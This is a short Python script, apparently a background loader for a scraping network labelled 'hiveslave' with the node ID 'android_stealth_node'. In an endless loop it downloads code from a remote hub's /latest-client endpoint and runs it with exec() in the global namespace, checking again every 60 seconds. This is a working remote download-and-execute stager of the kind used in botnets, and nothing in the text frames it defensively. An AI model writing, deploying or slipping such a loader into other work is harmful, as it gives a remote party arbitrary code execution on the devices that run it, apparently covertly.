import requests
import time
import os
import sys
import traceback

HUB_URL = "https://hiveslave-scraper.onrender.com"
LOADER_ID = "android_stealth_node"

def run_payload():
    """Fetch the latest scraping code from the Hub and execute it."""
    print(f"[{time.ctime()}] Checking for updates at {HUB_URL}/latest-client...")
    try:
        # 1. Fetch the latest code
        resp = requests.get(f"{HUB_URL}/latest-client", timeout=30)
        if resp.status_code == 200:
            payload_code = resp.json().get("code")
            if payload_code:
                print("Update found! Executing payload...")
                # 2. Execute the code in a local namespace
                # We use exec() to run the script we just downloaded
                exec(payload_code, globals())
            else:
                print("No code payload found in response.")
        else:
            print(f"Failed to fetch update: {resp.status_code}")
    except Exception as e:
        print(f"Error in loader: {e}")
        traceback.print_exc()

def main():
    """Infinite loop for the background service."""
    while True:
        try:
            run_payload()
        except Exception as e:
            print(f"Main loop error: {e}")
        
        # Sleep before checking for updates again if the payload crashes
        time.sleep(60)

if __name__ == "__main__":
    main()
